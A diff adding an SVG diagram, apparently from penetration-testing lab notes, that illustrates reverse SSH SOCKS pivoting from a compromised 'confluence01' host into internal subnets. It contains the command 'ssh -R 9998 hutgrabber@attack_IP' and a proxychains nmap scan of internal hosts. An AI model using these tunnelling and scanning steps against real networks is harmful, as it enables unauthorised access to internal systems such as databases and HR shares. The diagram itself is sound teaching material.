@@ -1,0 +1,58 @@
+<svg viewBox="0 0 1000 380" xmlns="http://www.w3.org/2000/svg" font-family="'JetBrains Mono', ui-monospace, Menlo, monospace">
+  <defs>
+    <marker id="arrPurpleRD" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0,0 L10,5 L0,10 z" fill="#a778e8"/>
+    </marker>
+    <marker id="arrGreenRD" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0,0 L10,5 L0,10 z" fill="#6fe3a1"/>
+    </marker>
+  </defs>
+
+  <rect x="0" y="0" width="1000" height="380" rx="14" fill="#12101c" stroke="#2e2547" stroke-width="1.5"/>
+  <circle cx="26" cy="24" r="5" fill="#f2707f"/>
+  <circle cx="44" cy="24" r="5" fill="#f0b45f"/>
+  <circle cx="62" cy="24" r="5" fill="#6fe3a1"/>
+  <text x="500" y="29" text-anchor="middle" fill="#8b84a2" font-size="12">ssh -R 9998 hutgrabber@attack_IP  (run FROM confluence01) · proxychains on kali → 127.0.0.1:9998</text>
+  <line x1="0" y1="40" x2="1000" y2="40" stroke="#2e2547" stroke-width="1"/>
+
+  <rect x="170" y="60" width="260" height="290" rx="10" fill="none" stroke="#7db8f0" stroke-width="1.5" stroke-dasharray="6 6"/>
+  <text x="300" y="80" text-anchor="middle" fill="#7db8f0" font-size="12" font-weight="bold">SUBNET A · 192.168.50.0/24</text>
+
+  <rect x="430" y="60" width="260" height="290" rx="10" fill="none" stroke="#63d8c8" stroke-width="1.5" stroke-dasharray="6 6"/>
+  <text x="560" y="80" text-anchor="middle" fill="#63d8c8" font-size="12" font-weight="bold">SUBNET B · 10.4.50.0/24</text>
+
+  <rect x="690" y="60" width="290" height="290" rx="10" fill="none" stroke="#f077b6" stroke-width="1.5" stroke-dasharray="6 6"/>
+  <text x="835" y="80" text-anchor="middle" fill="#f077b6" font-size="12" font-weight="bold">SUBNET C · 172.16.50.0/24</text>
+
+  <!-- proxychains box on kali side, fed by the reverse tunnel -->
+  <rect x="10" y="120" width="150" height="40" rx="8" fill="#171226" stroke="#f0b45f" stroke-width="1.5"/>
+  <text x="85" y="145" text-anchor="middle" fill="#f0b45f" font-size="11">proxychains → :9998</text>
+  <line x1="85" y1="160" x2="88" y2="173" stroke="#f0b45f" stroke-width="2"/>
+
+  <rect x="20" y="175" width="140" height="70" rx="10" fill="#1f1833" stroke="#6fe3a1" stroke-width="2"/>
+  <text x="90" y="205" text-anchor="middle" fill="#d8d4e4" font-size="14" font-weight="bold">you (kali)</text>
+  <text x="90" y="222" text-anchor="middle" fill="#8b84a2" font-size="11">socks server here</text>
+
+  <rect x="355" y="175" width="150" height="70" rx="10" fill="#1f1833" stroke="#a778e8" stroke-width="2"/>
+  <text x="430" y="205" text-anchor="middle" fill="#d8d4e4" font-size="14" font-weight="bold">confluence01</text>
+  <text x="430" y="222" text-anchor="middle" fill="#8b84a2" font-size="11">-R socks, no target</text>
+
+  <rect x="615" y="175" width="150" height="70" rx="10" fill="#1f1833" stroke="#a778e8" stroke-width="2"/>
+  <text x="690" y="205" text-anchor="middle" fill="#d8d4e4" font-size="14" font-weight="bold">pgdatabase01</text>
+  <text x="690" y="222" text-anchor="middle" fill="#8b84a2" font-size="11">use its INTERNAL ip</text>
+
+  <rect x="850" y="175" width="130" height="70" rx="10" fill="#1f1833" stroke="#f077b6" stroke-width="2"/>
+  <text x="915" y="205" text-anchor="middle" fill="#d8d4e4" font-size="14" font-weight="bold">hr_shares</text>
+  <text x="915" y="222" text-anchor="middle" fill="#8b84a2" font-size="11">reachable too</text>
+
+  <!-- reversed initiation of the socks tunnel itself -->
+  <line x1="353" y1="200" x2="162" y2="200" stroke="#a778e8" stroke-width="4" marker-end="url(#arrPurpleRD)"/>
+  <text x="256" y="188" text-anchor="middle" fill="#c39bf5" font-size="11" font-weight="bold">confluence01 opens the socks tunnel to you</text>
+
+  <!-- fan out from confluence01 into B/C, same as -D -->
+  <path d="M 505 215 L 613 215" fill="none" stroke="#6fe3a1" stroke-width="2.5" marker-end="url(#arrGreenRD)"/>
+  <path d="M 505 230 C 620 270, 780 270, 848 225" fill="none" stroke="#6fe3a1" stroke-width="2.5" marker-end="url(#arrGreenRD)"/>
+  <text x="690" y="288" text-anchor="middle" fill="#6fe3a1" font-size="11">proxychains nmap -sT 10.4.50.215 ...</text>
+
+  <text x="500" y="335" text-anchor="middle" fill="#8b84a2" font-size="11">the socks proxy itself now lives on YOUR box — the pivot dials out, then everything after is a normal -D fan-out</text>
+</svg>
